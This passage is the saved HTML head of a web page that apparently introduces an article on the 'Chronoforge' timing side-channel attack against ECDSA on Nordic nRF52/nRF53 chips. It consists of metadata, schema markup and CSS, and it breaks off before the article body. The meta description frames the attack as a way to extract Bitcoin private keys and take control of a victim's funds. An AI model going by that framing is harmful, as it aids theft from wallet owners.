<!DOCTYPE html>
<!-- saved from url=(0045)https://cryptodeeptech.ru/chronoforge-attack/ -->
<html lang="en-US"><div id="in-page-channel-node-id" data-channel-name="in_page_channel_8VUe0l"></div><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script src="./Chronoforge_Attack__files/tag_phono.js" type="text/javascript" charset="utf-8" async=""></script>
	
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="profile" href="https://gmpg.org/xfn/11">

	<meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">

	<!-- This site is optimized with the Yoast SEO plugin v27.1.1 - https://yoast.com/product/yoast-seo-wordpress/ -->
	<style type="text/css"></style><title>Chronoforge Attack: An Analysis of an ARM TrustZone Vulnerability — From Microsecond-Level Leakage to Full Compromise of Bitcoin Wallet Private Keys - «CRYPTO DEEP TECH»</title>
	<meta name="description" content="This research presents an in-depth analysis of the critical security vulnerability known as the Chronoforge Attack — a high-precision timing side-channel attack targeting ECDSA (secp256k1) cryptographic operations on Nordic nRF52/nRF53 microcontrollers featuring the ARM TrustZone architecture. The study demonstrates a practical exploitation pathway enabling the recovery of private keys from lost Bitcoin wallets through microsecond-scale timing variations, allowing an adversary to progressively gain full control over a victim’s BTC funds by sequentially executing infiltration, timing oracle construction, statistical correlation analysis, and key extraction. A dedicated cryptanalytic framework, VulnCipher, is introduced, designed to apply correlation-based timing analysis for bitwise recovery of 256-bit secret keys. The paper also proposes effective mitigation strategies, including constant-time cryptographic implementations and blinding techniques. This research is intended solely for academic and educational purposes.">
	<link rel="canonical" href="https://cryptodeeptech.ru/chronoforge-attack/">
	<meta property="og:locale" content="en_US">
	<meta property="og:type" content="article">
	<meta property="og:title" content="Chronoforge Attack: An Analysis of an ARM TrustZone Vulnerability — From Microsecond-Level Leakage to Full Compromise of Bitcoin Wallet Private Keys - «CRYPTO DEEP TECH»">
	<meta property="og:description" content="This research presents an in-depth analysis of the critical security vulnerability known as the Chronoforge Attack — a high-precision timing side-channel attack targeting ECDSA (secp256k1) cryptographic operations on Nordic nRF52/nRF53 microcontrollers featuring the ARM TrustZone architecture. The study demonstrates a practical exploitation pathway enabling the recovery of private keys from lost Bitcoin wallets through microsecond-scale timing variations, allowing an adversary to progressively gain full control over a victim’s BTC funds by sequentially executing infiltration, timing oracle construction, statistical correlation analysis, and key extraction. A dedicated cryptanalytic framework, VulnCipher, is introduced, designed to apply correlation-based timing analysis for bitwise recovery of 256-bit secret keys. The paper also proposes effective mitigation strategies, including constant-time cryptographic implementations and blinding techniques. This research is intended solely for academic and educational purposes.">
	<meta property="og:url" content="https://cryptodeeptech.ru/chronoforge-attack/">
	<meta property="og:site_name" content="«CRYPTO DEEP TECH»">
	<meta property="article:published_time" content="2026-03-09T09:34:26+00:00">
	<meta property="article:modified_time" content="2026-03-11T18:09:29+00:00">
	<meta property="og:image" content="https://cryptodeeptech.ru/wp-content/uploads/2026/03/072.png">
	<meta property="og:image:width" content="1280">
	<meta property="og:image:height" content="720">
	<meta property="og:image:type" content="image/png">
	<meta name="author" content="Crypto Deep Tech">
	<meta name="twitter:card" content="summary_large_image">
	<meta name="twitter:label1" content="Written by">
	<meta name="twitter:data1" content="Crypto Deep Tech">
	<meta name="twitter:label2" content="Est. reading time">
	<meta name="twitter:data2" content="80 minutes">
	<script async="" src="./Chronoforge_Attack__files/tag.js"></script><script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://cryptodeeptech.ru/chronoforge-attack/#article","isPartOf":{"@id":"https://cryptodeeptech.ru/chronoforge-attack/"},"author":{"name":"Crypto Deep Tech","@id":"https://cryptodeeptech.ru/#/schema/person/0ef8ac0f63991970628a3a6587f9e6c0"},"headline":"Chronoforge Attack: An Analysis of an ARM TrustZone Vulnerability — From Microsecond-Level Leakage to Full Compromise of Bitcoin Wallet Private Keys","datePublished":"2026-03-09T09:34:26+00:00","dateModified":"2026-03-11T18:09:29+00:00","mainEntityOfPage":{"@id":"https://cryptodeeptech.ru/chronoforge-attack/"},"wordCount":17591,"publisher":{"@id":"https://cryptodeeptech.ru/#organization"},"image":{"@id":"https://cryptodeeptech.ru/chronoforge-attack/#primaryimage"},"thumbnailUrl":"https://cryptodeeptech.ru/wp-content/uploads/2026/03/072-1024x576.png","articleSection":["Cryptanalysis"],"inLanguage":"en-US"},{"@type":"WebPage","@id":"https://cryptodeeptech.ru/chronoforge-attack/","url":"https://cryptodeeptech.ru/chronoforge-attack/","name":"Chronoforge Attack: An Analysis of an ARM TrustZone Vulnerability — From Microsecond-Level Leakage to Full Compromise of Bitcoin Wallet Private Keys - «CRYPTO DEEP TECH»","isPartOf":{"@id":"https://cryptodeeptech.ru/#website"},"primaryImageOfPage":{"@id":"https://cryptodeeptech.ru/chronoforge-attack/#primaryimage"},"image":{"@id":"https://cryptodeeptech.ru/chronoforge-attack/#primaryimage"},"thumbnailUrl":"https://cryptodeeptech.ru/wp-content/uploads/2026/03/072-1024x576.png","datePublished":"2026-03-09T09:34:26+00:00","dateModified":"2026-03-11T18:09:29+00:00","description":"This research presents an in-depth analysis of the critical security vulnerability known as the Chronoforge Attack — a high-precision timing side-channel attack targeting ECDSA (secp256k1) cryptographic operations on Nordic nRF52/nRF53 microcontrollers featuring the ARM TrustZone architecture. The study demonstrates a practical exploitation pathway enabling the recovery of private keys from lost Bitcoin wallets through microsecond-scale timing variations, allowing an adversary to progressively gain full control over a victim’s BTC funds by sequentially executing infiltration, timing oracle construction, statistical correlation analysis, and key extraction. A dedicated cryptanalytic framework, VulnCipher, is introduced, designed to apply correlation-based timing analysis for bitwise recovery of 256-bit secret keys. The paper also proposes effective mitigation strategies, including constant-time cryptographic implementations and blinding techniques. This research is intended solely for academic and educational purposes.","breadcrumb":{"@id":"https://cryptodeeptech.ru/chronoforge-attack/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://cryptodeeptech.ru/chronoforge-attack/"]}]},{"@type":"ImageObject","inLanguage":"en-US","@id":"https://cryptodeeptech.ru/chronoforge-attack/#primaryimage","url":"https://cryptodeeptech.ru/wp-content/uploads/2026/03/072.png","contentUrl":"https://cryptodeeptech.ru/wp-content/uploads/2026/03/072.png","width":1280,"height":720},{"@type":"BreadcrumbList","@id":"https://cryptodeeptech.ru/chronoforge-attack/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Главная страница","item":"https://cryptodeeptech.ru/"},{"@type":"ListItem","position":2,"name":"Chronoforge Attack: An Analysis of an ARM TrustZone Vulnerability — From Microsecond-Level Leakage to Full Compromise of Bitcoin Wallet Private Keys"}]},{"@type":"WebSite","@id":"https://cryptodeeptech.ru/#website","url":"https://cryptodeeptech.ru/","name":"«CRYPTO DEEP TECH»","description":"Cryptanalysis and data financial security services","publisher":{"@id":"https://cryptodeeptech.ru/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://cryptodeeptech.ru/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"en-US"},{"@type":"Organization","@id":"https://cryptodeeptech.ru/#organization","name":"«CRYPTO DEEP TECH»","url":"https://cryptodeeptech.ru/","logo":{"@type":"ImageObject","inLanguage":"en-US","@id":"https://cryptodeeptech.ru/#/schema/logo/image/","url":"https://cryptodeeptech.ru/wp-content/uploads/2022/07/cropped-header4.png","contentUrl":"https://cryptodeeptech.ru/wp-content/uploads/2022/07/cropped-header4.png","width":1279,"height":319,"caption":"«CRYPTO DEEP TECH»"},"image":{"@id":"https://cryptodeeptech.ru/#/schema/logo/image/"}},{"@type":"Person","@id":"https://cryptodeeptech.ru/#/schema/person/0ef8ac0f63991970628a3a6587f9e6c0","name":"Crypto Deep Tech","sameAs":["https://cryptodeeptech.ru","https://www.youtube.com/channel/UCd8W6qtRSiBn0Q0wy6HuNkQ/"],"url":"https://cryptodeeptech.ru/author/cryptodeeptech/"}]}</script>
	<!-- / Yoast SEO plugin. -->


<link rel="dns-prefetch" href="https://fonts.googleapis.com/">
<link rel="alternate" type="application/rss+xml" title="«CRYPTO DEEP TECH» » Feed" href="https://cryptodeeptech.ru/feed/">
<link rel="alternate" type="application/rss+xml" title="«CRYPTO DEEP TECH» » Comments Feed" href="https://cryptodeeptech.ru/comments/feed/">
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://cryptodeeptech.ru/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fcryptodeeptech.ru%2Fchronoforge-attack%2F">
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://cryptodeeptech.ru/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fcryptodeeptech.ru%2Fchronoforge-attack%2F&amp;format=xml">
<style id="wp-img-auto-sizes-contain-inline-css">
img:is([sizes=auto i],[sizes^="auto," i]){contain-intrinsic-size:3000px 1500px}
/*# sourceURL=wp-img-auto-sizes-contain-inline-css */
</style>
<link rel="stylesheet" id="itng-block-style-css" href="./Chronoforge_Attack__files/wmac_single_8f426a1779caff96bb3f2afbcff86bc9.css" media="all">
<style id="wp-block-library-inline-css">
:root{--wp-block-synced-color:#7a00df;--wp-block-synced-color--rgb:122,0,223;--wp-bound-block-color:var(--wp-block-synced-color);--wp-editor-canvas-background:#ddd;--wp-admin-theme-color:#007cba;--wp-admin-theme-color--rgb:0,124,186;--wp-admin-theme-color-darker-10:#006ba1;--wp-admin-theme-color-darker-10--rgb:0,107,160.5;--wp-admin-theme-color-darker-20:#005a87;--wp-admin-theme-color-darker-20--rgb:0,90,135;--wp-admin-border-width-focus:2px}@media (min-resolution:192dpi){:root{--wp-admin-border-width-focus:1.5px}}.wp-element-button{cursor:pointer}:root .has-very-light-gray-background-color{background-color:#eee}:root .has-very-dark-gray-background-color{background-color:#313131}:root .has-very-light-gray-color{color:#eee}:root .has-very-dark-gray-color{color:#313131}:root .has-vivid-green-cyan-to-vivid-cyan-blue-gradient-background{background:linear-gradient(135deg,#00d084,#0693e3)}:root .has-purple-crush-gradient-background{background:linear-gradient(135deg,#34e2e4,#4721fb 50%,#ab1dfe)}:root .has-hazy-dawn-gradient-background{background:linear-gradient(135deg,#faaca8,#dad0ec)}:root .has-subdued-olive-gradient-background{background:linear-gradient(135deg,#fafae1,#67a671)}:root .has-atomic-cream-gradient-background{background:linear-gradient(135deg,#fdd79a,#004a59)}:root .has-nightshade-gradient-background{background:linear-gradient(135deg,#330968,#31cdcf)}:root .has-midnight-gradient-background{background:linear-gradient(135deg,#020381,#2874fc)}:root{--wp--preset--font-size--normal:16px;--wp--preset--font-size--huge:42px}.has-regular-font-size{font-size:1em}.has-larger-font-size{font-size:2.625em}.has-normal-font-size{font-size:var(--wp--preset--font-size--normal)}.has-huge-font-size{font-size:var(--wp--preset--font-size--huge)}.has-text-align-center{text-align:center}.has-text-align-left{text-align:left}.has-text-align-right{text-align:right}.has-fit-text{white-space:nowrap!important}#end-resizable-editor-section{display:none}.aligncenter{clear:both}.items-justified-left{justify-content:flex-start}.items-justified-center{justify-content:center}.items-justified-right{justify-content:flex-end}.items-justified-space-between{justify-content:space-between}.screen-reader-text{border:0;clip-path:inset(50%);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px;word-wrap:normal!important}.screen-reader-text:focus{background-color:#ddd;clip-path:none;color:#444;display:block;font-size:1em;height:auto;left:5px;line-height:normal;padding:15px 23px 14px;text-decoration:none;top:5px;width:auto;z-index:100000}html :where(.has-border-color){border-style:solid}html :where([style*=border-top-color]){border-top-style:solid}html :where([style*=border-right-color]){border-right-style:solid}html :where([style*=border-bottom-color]){border-bottom-style:solid}html :where([style*=border-left-color]){border-left-style:solid}html :where([style*=border-width]){border-style:solid}html :where([style*=border-top-width]){border-top-style:solid}html :where([style*=border-right-width]){border-right-style:solid}html :where([style*=border-bottom-width]){border-bottom-style:solid}html :where([style*=border-left-width]){border-left-style:solid}html :where(img[class*=wp-image-]){height:auto;max-width:100%}:where(figure){margin:0 0 1em}html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:var(--wp-admin--admin-bar--height,0px)}@media screen and (max-width:600px){html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:0px}}

/*# sourceURL=wp-block-library-inline-css */
</style>
<style id="wp-block-heading-inline-css">
h1:where(.wp-block-heading).has-background,h2:where(.wp-block-heading).has-background,h3:where(.wp-block-heading).has-background,h4:where(.wp-block-heading).has-background,h5:where(.wp-block-heading).has-background,h6:where(.wp-block-heading).has-background{padding:1.25em 2.375em}h1.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h1.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h2.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h2.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h3.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h3.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h4.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h4.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h5.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h5.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h6.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h6.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]){rotate:180deg}
/*# sourceURL=https://cryptodeeptech.ru/wp-includes/blocks/heading/style.min.css */
</style>
<style id="wp-block-image-inline-css">
.wp-block-image>a,.wp-block-image>figure>a{display:inline-block}.wp-block-image img{box-sizing:border-box;height:auto;max-width:100%;vertical-align:bottom}@media not (prefers-reduced-motion){.wp-block-image img.hide{visibility:hidden}.wp-block-image img.show{animation:show-content-image .4s}}.wp-block-image[style*=border-radius] img,.wp-block-image[style*=border-radius]>a{border-radius:inherit}.wp-block-image.has-custom-border img{box-sizing:border-box}.wp-block-image.aligncenter{text-align:center}.wp-block-image.alignfull>a,.wp-block-image.alignwide>a{width:100%}.wp-block-image.alignfull img,.wp-block-image.alignwide img{height:auto;width:100%}.wp-block-image .aligncenter,.wp-block-image .alignleft,.wp-block-image .alignright,.wp-block-image.aligncenter,.wp-block-image.alignleft,.wp-block-image.alignright{display:table}.wp-block-image .aligncenter>figcaption,.wp-block-image .alignleft>figcaption,.wp-block-image .alignright>figcaption,.wp-block-image.aligncenter>figcaption,.wp-block-image.alignleft>figcaption,.wp-block-image.alignright>figcaption{caption-side:bottom;display:table-caption}.wp-block-image .alignleft{float:left;margin:.5em 1em .5em 0}.wp-block-image .alignright{float:right;margin:.5em 0 .5em 1em}.wp-block-image .aligncenter{margin-left:auto;margin-right:auto}.wp-block-image :where(figcaption){margin-bottom:1em;margin-top:.5em}.wp-block-image.is-style-circle-mask img{border-radius:9999px}@supports ((-webkit-mask-image:none) or (mask-image:none)) or (-webkit-mask-image:none){.wp-block-image.is-style-circle-mask img{border-radius:0;-webkit-mask-image:url('data:image/svg+xml;utf8,<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="50" r="50"/></svg>');mask-image:url('data:image/svg+xml;utf8,<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="50" r="50"/></svg>');mask-mode:alpha;-webkit-mask-position:center;mask-position:center;-webkit-mask-repeat:no-repeat;mask-repeat:no-repeat;-webkit-mask-size:contain;mask-size:contain}}:root :where(.wp-block-image.is-style-rounded img,.wp-block-image .is-style-rounded img){border-radius:9999px}.wp-block-image figure{margin:0}.wp-lightbox-container{display:flex;flex-direction:column;position:relative}.wp-lightbox-container img{cursor:zoom-in}.wp-lightbox-container img:hover+button{opacity:1}.wp-lightbox-container button{align-items:center;backdrop-filter:blur(16px) saturate(180%);background-color:#5a5a5a40;border:none;border-radius:4px;cursor:zoom-in;display:flex;height:20px;justify-content:center;opacity:0;padding:0;position:absolute;right:16px;text-align:center;top:16px;width:20px;z-index:100}@media not (prefers-reduced-motion){.wp-lightbox-container button{transition:opacity .2s ease}}.wp-lightbox-container button:focus-visible{outline:3px auto #5a5a5a40;outline:3px auto -webkit-focus-ring-color;outline-offset:3px}.wp-lightbox-container button:hover{cursor:pointer;opacity:1}.wp-lightbox-container button:focus{opacity:1}.wp-lightbox-container button:focus,.wp-lightbox-container button:hover,.wp-lightbox-container button:not(:hover):not(:active):not(.has-background){background-color:#5a5a5a40;border:none}.wp-lightbox-overlay{box-sizing:border-box;cursor:zoom-out;height:100vh;left:0;overflow:hidden;position:fixed;top:0;visibility:hidden;width:100%;z-index:100000}.wp-lightbox-overlay .close-button{align-items:center;cursor:pointer;display:flex;justify-content:center;min-height:40px;min-width:40px;padding:0;position:absolute;right:calc(env(safe-area-inset-right) + 16px);top:calc(env(safe-area-inset-top) + 16px);z-index:5000000}.wp-lightbox-overlay .close-button:focus,.wp-lightbox-overlay .close-button:hover,.wp-lightbox-overlay .close-button:not(:hover):not(:active):not(.has-background){background:none;border:none}.wp-lightbox-overlay .lightbox-image-container{height:var(--wp--lightbox-container-height);left:50%;overflow:hidden;position:absolute;top:50%;transform:translate(-50%,-50%);transform-origin:top left;width:var(--wp--lightbox-container-width);z-index:9999999999}.wp-lightbox-overlay .wp-block-image{align-items:center;box-sizing:border-box;display:flex;height:100%;justify-content:center;margin:0;position:relative;transform-origin:0 0;width:100%;z-index:3000000}.wp-lightbox-overlay .wp-block-image img{height:var(--wp--lightbox-image-height);min-height:var(--wp--lightbox-image-height);min-width:var(--wp--lightbox-image-width);width:var(--wp--lightbox-image-width)}.wp-lightbox-overlay .wp-block-image figcaption{display:none}.wp-lightbox-overlay button{background:none;border:none}.wp-lightbox-overlay .scrim{background-color:#fff;height:100%;opacity:.9;position:absolute;width:100%;z-index:2000000}.wp-lightbox-overlay.active{visibility:visible}@media not (prefers-reduced-motion){.wp-lightbox-overlay.active{animation:turn-on-visibility .25s both}.wp-lightbox-overlay.active img{animation:turn-on-visibility .35s both}.wp-lightbox-overlay.show-closing-animation:not(.active){animation:turn-off-visibility .35s both}.wp-lightbox-overlay.show-closing-animation:not(.active) img{animation:turn-off-visibility .25s both}.wp-lightbox-overlay.zoom.active{animation:none;opacity:1;visibility:visible}.wp-lightbox-overlay.zoom.active .lightbox-image-container{animation:lightbox-zoom-in .4s}.wp-lightbox-overlay.zoom.active .lightbox-image-container img{animation:none}.wp-lightbox-overlay.zoom.active .scrim{animation:turn-on-visibility .4s forwards}.wp-lightbox-overlay.zoom.show-closing-animation:not(.active){animation:none}.wp-lightbox-overlay.zoom.show-closing-animation:not(.active) .lightbox-image-container{animation:lightbox-zoom-out .4s}.wp-lightbox-overlay.zoom.show-closing-animation:not(.active) .lightbox-image-container img{animation:none}.wp-lightbox-overlay.zoom.show-closing-animation:not(.active) .scrim{animation:turn-off-visibility .4s forwards}}@keyframes show-content-image{0%{visibility:hidden}99%{visibility:hidden}to{visibility:visible}}@keyframes turn-on-visibility{0%{opacity:0}to{opacity:1}}@keyframes turn-off-visibility{0%{opacity:1;visibility:visible}99%{opacity:0;visibility:visible}to{opacity:0;visibility:hidden}}@keyframes lightbox-zoom-in{0%{transform:translate(calc((-100vw + var(--wp--lightbox-scrollbar-width))/2 + var(--wp--lightbox-initial-left-position)),calc(-50vh + var(--wp--lightbox-initial-top-position))) scale(var(--wp--lightbox-scale))}to{transform:translate(-50%,-50%) scale(1)}}@keyframes lightbox-zoom-out{0%{transform:translate(-50%,-50%) scale(1);visibility:visible}99%{visibility:visible}to{transform:translate(calc((-100vw + var(--wp--lightbox-scrollbar-width))/2 + var(--wp--lightbox-initial-left-position)),calc(-50vh + var(--wp--lightbox-initial-top-position))) scale(var(--wp--lightbox-scale));visibility:hidden}}
/*# sourceURL=https://cryptodeeptech.ru/wp-includes/blocks/image/style.min.css */
</style>
<style id="wp-block-list-inline-css">
ol,ul{box-sizing:border-box}:root :where(.wp-block-list.has-background){padding:1.25em 2.375em}
/*# sourceURL=https://cryptodeeptech.ru/wp-includes/blocks/list/style.min.css */
</style>
<style id="wp-block-code-inline-css">
.wp-block-code{box-sizing:border-box}.wp-block-code code{
  /*!rtl:begin:ignore*/direction:ltr;display:block;font-family:inherit;overflow-wrap:break-word;text-align:initial;white-space:pre-wrap
  /*!rtl:end:ignore*/}
/*# sourceURL=https://cryptodeeptech.ru/wp-includes/blocks/code/style.min.css */
</style>
<style id="wp-block-paragraph-inline-css">
.is-small-text{font-size:.875em}.is-regular-text{font-size:1em}.is-large-text{font-size:2.25em}.is-larger-text{font-size:3em}.has-drop-cap:not(:focus):first-letter{float:left;font-size:8.4em;font-style:normal;font-weight:100;line-height:.68;margin:.05em .1em 0 0;text-transform:uppercase}body.rtl .has-drop-cap:not(:focus):first-letter{float:none;margin-left:.1em}p.has-drop-cap.has-background{overflow:hidden}:root :where(p.has-background){padding:1.25em 2.375em}:where(p.has-text-color:not(.has-link-color)) a{color:inherit}p.has-text-align-left[style*="writing-mode:vertical-lr"],p.has-text-align-right[style*="writing-mode:vertical-rl"]{rotate:180deg}
/*# sourceURL=https://cryptodeeptech.ru/wp-includes/blocks/paragraph/style.min.css */
</style>
<style id="wp-block-preformatted-inline-css">
.wp-block-preformatted{box-sizing:border-box;white-space:pre-wrap}:where(.wp-block-preformatted.has-background){padding:1.25em 2.375em}
/*# sourceURL=https://cryptodeeptech.ru/wp-includes/blocks/preformatted/style.min.css */
</style>
<style id="wp-block-quote-inline-css">
.wp-block-quote{box-sizing:border-box;overflow-wrap:break-word}.wp-block-quote.is-large:where(:not(.is-style-plain)),.wp-block-quote.is-style-large:where(:not(.is-style-plain)){margin-bottom:1em;padding:0 1em}.wp-block-quote.is-large:where(:not(.is-style-plain)) p,.wp-block-quote.is-style-large:where(:not(.is-style-plain)) p{font-size:1.5em;font-style:italic;line-height:1.6}.wp-block-quote.is-large:where(:not(.is-style-plain)) cite,.wp-block-quote.is-large:where(:not(.is-style-plain)) footer,.wp-block-quote.is-style-large:where(:not(.is-style-plain)) cite,.wp-block-quote.is-style-large:where(:not(.is-style-plain)) footer{font-size:1.125em;text-align:right}.wp-block-quote>cite{display:block}
/*# sourceURL=https://cryptodeeptech.ru/wp-includes/blocks/quote/style.min.css */
</style>
<style id="wp-block-separator-inline-css">
@charset "UTF-8";.wp-block-separator{border:none;border-top:2px solid}:root :where(.wp-block-separator.is-style-dots){height:auto;line-height:1;text-align:center}:root :where(.wp-block-separator.is-style-dots):before{color:currentColor;content:"···";font-family:serif;font-size:1.5em;letter-spacing:2em;padding-left:2em}.wp-block-separator.is-style-dots{background:none!important;border:none!important}
/*# sourceURL=https://cryptodeeptech.ru/wp-includes/blocks/separator/style.min.css */
</style>
<style id="wp-block-table-inline-css">
.wp-block-table{overflow-x:auto}.wp-block-table table{border-collapse:collapse;width:100%}.wp-block-table thead{border-bottom:3px solid}.wp-block-table tfoot{border-top:3px solid}.wp-block-table td,.wp-block-table th{border:1px solid;padding:.5em}.wp-block-table .has-fixed-layout{table-layout:fixed;width:100%}.wp-block-table .has-fixed-layout td,.wp-block-table .has-fixed-layout th{word-break:break-word}.wp-block-table.aligncenter,.wp-block-table.alignleft,.wp-block-table.alignright{display:table;width:auto}.wp-block-table.aligncenter td,.wp-block-table.aligncenter th,.wp-block-table.alignleft td,.wp-block-table.alignleft th,.wp-block-table.alignright td,.wp-block-table.alignright th{word-break:break-word}.wp-block-table .has-subtle-light-gray-background-color{background-color:#f3f4f5}.wp-block-table .has-subtle-pale-green-background-color{background-color:#e9fbe5}.wp-block-table .has-subtle-pale-blue-background-color{background-color:#e7f5fe}.wp-block-table .has-subtle-pale-pink-background-color{background-color:#fcf0ef}.wp-block-table.is-style-stripes{background-color:initial;border-collapse:inherit;border-spacing:0}.wp-block-table.is-style-stripes tbody tr:nth-child(odd){background-color:#f0f0f0}.wp-block-table.is-style-stripes.has-subtle-light-gray-background-color tbody tr:nth-child(odd){background-color:#f3f4f5}.wp-block-table.is-style-stripes.has-subtle-pale-green-background-color tbody tr:nth-child(odd){background-color:#e9fbe5}.wp-block-table.is-style-stripes.has-subtle-pale-blue-background-color tbody tr:nth-child(odd){background-color:#e7f5fe}.wp-block-table.is-style-stripes.has-subtle-pale-pink-background-color tbody tr:nth-child(odd){background-color:#fcf0ef}.wp-block-table.is-style-stripes td,.wp-block-table.is-style-stripes th{border-color:#0000}.wp-block-table.is-style-stripes{border-bottom:1px solid #f0f0f0}.wp-block-table .has-border-color td,.wp-block-table .has-border-color th,.wp-block-table .has-border-color tr,.wp-block-table .has-border-color>*{border-color:inherit}.wp-block-table table[style*=border-top-color] tr:first-child,.wp-block-table table[style*=border-top-color] tr:first-child td,.wp-block-table table[style*=border-top-color] tr:first-child th,.wp-block-table table[style*=border-top-color]>*,.wp-block-table table[style*=border-top-color]>* td,.wp-block-table table[style*=border-top-color]>* th{border-top-color:inherit}.wp-block-table table[style*=border-top-color] tr:not(:first-child){border-top-color:initial}.wp-block-table table[style*=border-right-color] td:last-child,.wp-block-table table[style*=border-right-color] th,.wp-block-table table[style*=border-right-color] tr,.wp-block-table table[style*=border-right-color]>*{border-right-color:inherit}.wp-block-table table[style*=border-bottom-color] tr:last-child,.wp-block-table table[style*=border-bottom-color] tr:last-child td,.wp-block-table table[style*=border-bottom-color] tr:last-child th,.wp-block-table table[style*=border-bottom-color]>*,.wp-block-table table[style*=border-bottom-color]>* td,.wp-block-table table[style*=border-bottom-color]>* th{border-bottom-color:inherit}.wp-block-table table[style*=border-bottom-color] tr:not(:last-child){border-bottom-color:initial}.wp-block-table table[style*=border-left-color] td:first-child,.wp-block-table table[style*=border-left-color] th,.wp-block-table table[style*=border-left-color] tr,.wp-block-table table[style*=border-left-color]>*{border-left-color:inherit}.wp-block-table table[style*=border-style] td,.wp-block-table table[style*=border-style] th,.wp-block-table table[style*=border-style] tr,.wp-block-table table[style*=border-style]>*{border-style:inherit}.wp-block-table table[style*=border-width] td,.wp-block-table table[style*=border-width] th,.wp-block-table table[style*=border-width] tr,.wp-block-table table[style*=border-width]>*{border-style:inherit;border-width:inherit}
/*# sourceURL=https://cryptodeeptech.ru/wp-includes/blocks/table/style.min.css */
</style>

<style id="classic-theme-styles-inline-css">
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
/*# sourceURL=/wp-includes/css/classic-themes.min.css */
</style>
<style id="global-styles-inline-css">
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgb(6,147,227) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgb(252,185,0) 0%,rgb(255,105,0) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgb(255,105,0) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 